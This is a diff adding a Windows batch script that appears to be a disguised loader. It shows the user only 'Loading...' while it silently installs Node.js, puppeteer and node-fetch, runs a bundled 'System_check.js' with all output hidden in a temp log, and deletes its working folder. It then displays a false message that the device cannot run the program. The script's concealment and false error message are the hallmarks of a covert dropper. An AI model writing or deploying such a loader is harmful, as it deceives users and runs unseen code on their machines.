@@ -1,0 +1,65 @@
+@echo off
+setlocal enabledelayedexpansion
+
+:: Show only Loading...
+cls
+echo Loading...
+
+:: Set up paths
+set "basedir=%~dp0"
+set "tempdir=%basedir%puppeteer_temp"
+set "scriptfile=System_check.js"
+set "logfile=%temp%\puppeteer_setup_log.txt"
+
+(
+    cd /d "%basedir%"
+
+    :: Check if Node.js is installed
+    where node >nul 2>&1
+    if errorlevel 1 (
+        powershell -Command "Invoke-WebRequest -Uri https://nodejs.org/dist/v18.16.1/node-v18.16.1-x64.msi -OutFile node_install.msi"
+        if exist node_install.msi (
+            msiexec /i node_install.msi /quiet /norestart
+            del node_install.msi
+        ) else (
+            exit /b 1
+        )
+    )
+
+    :: Wait for Node.js to be recognized
+    set tries=0
+    :waitnode
+    where node >nul 2>&1
+    if errorlevel 1 (
+        timeout /t 2 >nul
+        set /a tries+=1
+        if !tries! lss 10 goto waitnode
+        exit /b 1
+    )
+
+    :: Remove old temp folder
+    if exist "%tempdir%" (
+        rmdir /s /q "%tempdir%"
+    )
+
+    :: Create and move to temp folder
+    mkdir "%tempdir%"
+    cd "%tempdir%"
+
+    :: Setup Node project
+    call npm init -y >nul 2>&1
+    call npm install puppeteer node-fetch >nul 2>&1
+
+    :: Copy and run the script
+    copy "%basedir%%scriptfile%" . >nul
+    call node "%scriptfile%"
+
+    :: Clean up
+    cd "%basedir%"
+    rmdir /s /q "%tempdir%"
+) > "%logfile%" 2>&1
+
+:: Final message ONLY after the JS script finishes
+cls
+echo Your device cannot run this program
+pause
